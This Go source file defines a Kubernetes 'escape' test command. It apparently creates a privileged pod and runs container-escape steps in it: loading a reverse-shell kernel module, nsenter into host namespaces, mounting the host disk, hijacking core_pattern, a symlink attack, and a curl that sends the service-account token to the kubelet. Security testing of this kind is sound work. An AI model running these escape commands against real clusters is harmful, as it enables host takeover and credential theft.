package cmd

import (
	"context"
	"encoding/json"
	"fmt"
	app "main/internal/app"
	"time"

	"github.com/spf13/cobra"

	// auth plugins for kubeconfig (gcp, oidc, etc.)
	_ "k8s.io/client-go/plugin/pkg/client/auth"
)

var (
	kubeconfig string
	namespace  string
	image      string
	timeout    time.Duration
	stopper    bool
	privileged bool
)

func init() {
	rootCmd.AddCommand(escapeCmd)

	escapeCmd.Flags().StringVar(&kubeconfig, "kubeconfig", "", "path to kubeconfig file (default KUBECONFIG or $HOME/.kube/config)")
	escapeCmd.Flags().StringVarP(&namespace, "namespace", "n", "default", "namespace for test pod")
	escapeCmd.Flags().StringVarP(&image, "image", "i", "nicolaka/netshoot:latest", "image to use for test pod")
	escapeCmd.Flags().DurationVarP(&timeout, "timeout", "t", 3*time.Minute, "overall timeout for the test")
	escapeCmd.Flags().BoolVarP(&stopper, "stopper", "s", false, "waits for the user to press a key after each command is executed, allowing them to be executed step by step")
	escapeCmd.Flags().BoolVar(&privileged, "privileged", false, "create privileged pod with (Privileged = true), (HostPID = true), (HostPath = '/hostroot'), (Caps = 'SYS_ADMIN', 'NET_ADMIN', 'SYS_PTRACE')")
}

var escapeCmd = &cobra.Command{
	Use:   "escape",
	Short: "Run single escape test (creates privileged pod, mounts host root, execs checks)",
	RunE: func(cmd *cobra.Command, args []string) error {
		cfg, clientset, err := app.GetKubeconfig(kubeconfig)

		ctx, cancel := context.WithTimeout(context.Background(), timeout)
		defer cancel()

		commands := [][]string{
			{"id"},
			{"uname", "-a"},
			{"cat", "/proc/1/cgroup"},
			{"/bin/sh", "-c", "cat /proc/self/status | grep -i cap"},
			{"insmod", "/test/reverse_shell.ko"},
			{"nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"},
			{"mkdir", "-p", "/mnt/hostfs"},
			{"mount", "/dev/vda1", "/mnt/hostfs"},
			{"ls", "-lah", "/mnt/hostfs/"},
			{"echo", "|$overlay/shell.sh", ">", "/proc/sys/kernel/core_pattern"},
			{"ls", "/var/run/docker.socket"},
			//GDB
			{"/bin/sh", "-c", "cat /etc/mtab | head -n 10"},
			//CHECK SYMLINK ATTK
			{"/bin/sh", "-c", "ln -s / /host/var/log/root_link"},
			{"curl -sk -H 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)' https://$($(ip route | awk '/^default/{print $3}')):10250/logs/root_link/var/lib/kubelet/pods/"},
			{"/bin/sh", "-c", "chroot /proc/1/root"},
		}

		results, err := app.ExecCommands(ctx, clientset, image, commands, cfg, namespace, stopper, privileged)
		if err != nil {
			fmt.Println(err)
		}

		out := map[string]interface{}{
			"results": results,
		}

		enc, _ := json.MarshalIndent(out, "", "  ")
		fmt.Println(string(enc))
		return nil
	},
}
